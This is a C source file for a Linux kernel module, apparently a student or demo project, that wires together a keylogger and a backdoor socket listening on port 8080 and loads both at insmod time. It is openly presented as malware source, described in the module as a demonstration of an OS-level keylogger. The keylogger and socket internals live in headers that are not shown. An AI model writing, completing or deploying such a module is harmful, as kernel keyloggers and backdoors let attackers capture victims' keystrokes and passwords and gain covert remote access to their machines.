#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "backdoor_socket.h"
#include "keylogger.h"


// port the backdoor will be listening for connections on.
#define PORT 8080

/*
 * backdoor_init initializes the backdoor module, marked as __init because it
 * is not needed after insmod completes.
 */
static int __init backdoor_init(void)
{
  int err;

	printk(KERN_DEBUG "backdoor: initializing backdoor module\n");
	err = keylogger_module_init();
  if(err){
    printk(KERN_ERR "backdoor: error initializing keylogger\n");
    keylogger_module_exit();
    return err;
  }

  err = backdoor_socket_init(PORT);
  if(err){
    printk(KERN_ERR "backdoor: error initializing socket\n");
    backdoor_socket_exit();
    return err;
  }

  printk(KERN_DEBUG "backdoor: initialization complete\n");
	return 0;
}

/*
 * backdoor_exit stops and closes all resources associated with the backdoor
 * module, marked as __exit because it is not needed until rmmod is called.
 */
static void __exit backdoor_exit(void)
{
	printk(KERN_DEBUG "backdoor: exiting backdoor module\n");

	backdoor_socket_exit();
	keylogger_module_exit();

	printk(KERN_DEBUG "backdoor: exiting complete\n");
}

// set basic info about the module, important for modinfo and lsmod.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lucas Eduardo Gulka Pulcinelli");
MODULE_AUTHOR("Matheus Henrique Dias Cirillo");
MODULE_AUTHOR("Carlos Henrique Craveiro Aquino Veras");
MODULE_DESCRIPTION(
	"A demonstration of a keylogger at the operating system level");
MODULE_VERSION("0.0.1");

// set the main init and exit functions.
module_init(backdoor_init);
module_exit(backdoor_exit);
